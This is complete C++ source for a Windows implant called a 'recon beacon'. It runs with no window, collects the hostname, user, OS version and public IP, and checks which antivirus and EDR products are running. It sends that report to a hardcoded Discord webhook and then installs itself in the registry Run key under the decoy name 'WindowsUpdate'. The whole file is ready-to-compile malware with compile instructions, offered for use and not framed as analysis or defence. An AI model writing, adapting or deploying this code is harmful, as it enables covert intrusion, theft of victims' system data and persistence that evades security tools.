/*
 * check.cpp — Lightweight Recon Beacon → /check
 * Compile: x86_64-w64-mingw32-g++ -static -O2 -s -o check.exe check.cpp -lwinhttp -lwininet -ladvapi32 -mwindows
 *          (drop -mwindows if you want console for debugging)
 *
 * What it does:
 *   1. Grabs system fingerprint (hostname, user, OS, IP, AV check)
 *   2. POSTs JSON to your Discord webhook
 *   3. Sets registry persistence (HKCU Run)
 *   4. Exits clean — sub-second execution
 */

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <cstdio>
#include <string>
#include <sstream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================
//  CONFIG — Replace with your endpoint
// ============================================================
#define WEBHOOK_URL L"https://discord.com/api/webhooks/1533019807627214928/n1FLzESTi1BhzC5R90ok8V7esa2RasQzOFhZVLoEeA-cBoUSB2DXuobLhhTuwc4n1BQf"
#define PERSISTENCE_NAME L"WindowsUpdate"
// ============================================================

// --- WinHTTP GET helper ---
std::string HttpGet(const wchar_t* host, const wchar_t* path) {
    std::string result;
    HINTERNET hSess = WinHttpOpen(L"check/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSess) return result;

    HINTERNET hConn = WinHttpConnect(hSess, host, 443, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return result; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path,
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return result; }

    if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) &&
        WinHttpReceiveResponse(hReq, NULL)) {
        char buf[2048]; DWORD read = 0;
        while (WinHttpReadData(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {
            buf[read] = 0;
            result += buf;
        }
    }
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return result;
}

// --- WinHTTP POST helper ---
bool HttpPost(const wchar_t* host, const wchar_t* path, const std::string& body) {
    HINTERNET hSess = WinHttpOpen(L"check/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSess) return false;

    HINTERNET hConn = WinHttpConnect(hSess, host, 443, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return false; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", path,
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return false; }

    LPCWSTR hdrs = L"Content-Type: application/json\r\n";
    bool ok = WinHttpSendRequest(hReq, hdrs, -1,
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) WinHttpReceiveResponse(hReq, NULL);

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return ok;
}

// --- JSON string escape ---
std::string JsonEscape(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"':  out += "\\\""; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:   out += c;
        }
    }
    return out;
}

// --- System info gatherer ---
std::string GatherFingerprint() {
    // Hostname + User
    char host[256] = {}, user[256] = {};
    DWORD sz = sizeof(host); GetComputerNameA(host, &sz);
    sz = sizeof(user); GetUserNameA(user, &sz);

    // OS version
    std::string osVer = "Unknown";
    {
        HKEY hk;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hk) == ERROR_SUCCESS) {
            char buf[128]; DWORD s = sizeof(buf);
            if (RegQueryValueExA(hk, "ProductName", NULL, NULL,
                (LPBYTE)buf, &s) == ERROR_SUCCESS) osVer = buf;
            RegCloseKey(hk);
        }
    }

    // Public IP
    std::string pubIp = HttpGet(L"api.ipify.org", L"/");
    if (pubIp.empty()) pubIp = "N/A";

    // AV / EDR check (quick process sniff)
    std::string avFound;
    {
        const wchar_t* avProcs[] = {
            L"MsMpEng.exe", L"avp.exe", L"bdagent.exe", L"NortonSecurity.exe",
            L"McAfeeEngine.exe", L"SACore.exe", L"csfalconservice.exe",
            L"SentinelAgent.exe", L"cb.exe", L"Cybereason.exe", NULL
        };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {sizeof(pe)};
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (int i = 0; avProcs[i]; i++) {
                        if (_wcsicmp(pe.szExeFile, avProcs[i]) == 0) {
                            if (!avFound.empty()) avFound += ", ";
                            // Convert wide to narrow for the report string
                            char buf[256];
                            WideCharToMultiByte(CP_UTF8, 0, avProcs[i], -1, buf, sizeof(buf), NULL, NULL);
                            avFound += buf;
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
    }
    if (avFound.empty()) avFound = "None detected";

    std::ostringstream ss;
    ss << "Host: " << host << "\\n"
       << "User: " << user << "\\n"
       << "OS: " << osVer << "\\n"
       << "IP: " << pubIp << "\\n"
       << "AV/EDR: " << avFound;
    return ss.str();
}

// --- Persistence (HKCU Run) ---
void SetPersistence(const wchar_t* exePath) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExW(hk, PERSISTENCE_NAME, 0, REG_SZ,
            (const BYTE*)exePath,
            (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }
}

// --- Parse webhook URL into host+path ---
void ParseWebhookUrl(const wchar_t* url, std::wstring& host, std::wstring& path) {
    // https://discord.com/api/webhooks/ID/TOKEN
    std::wstring u(url);
    size_t start = u.find(L"://");
    if (start == std::wstring::npos) { host = url; path = L"/"; return; }
    start += 3;
    size_t slash = u.find(L'/', start);
    if (slash == std::wstring::npos) {
        host = u.substr(start);
        path = L"/";
    } else {
        host = u.substr(start, slash - start);
        path = u.substr(slash);
    }
}

// ============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 1. Gather fingerprint
    std::string fp = GatherFingerprint();

    // 2. Build JSON embed
    std::string json = "{\"embeds\":[{\"title\":\"Check-in\","
        "\"description\":\"" + JsonEscape(fp) + "\","
        "\"color\":65280}]}";

    // 3. POST to webhook
    std::wstring host, path;
    ParseWebhookUrl(WEBHOOK_URL, host, path);
    HttpPost(host.c_str(), path.c_str(), json);

    // 4. Persistence
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    SetPersistence(selfPath);

    return 0;
}